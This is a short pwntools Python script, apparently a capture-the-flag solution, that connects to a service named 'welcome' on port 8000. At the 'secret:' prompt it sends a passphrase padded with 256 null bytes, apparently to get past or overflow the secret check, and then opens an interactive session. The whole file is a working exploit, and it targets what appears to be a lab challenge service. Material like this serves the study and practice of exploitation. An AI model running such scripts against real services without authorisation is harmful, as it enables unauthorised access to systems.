from pwn import *

r = remote('welcome',8000)



msg = b'I love UNIX programming!' + b'\x00' * 256
r.sendlineafter('secret:',msg)
r.interactive()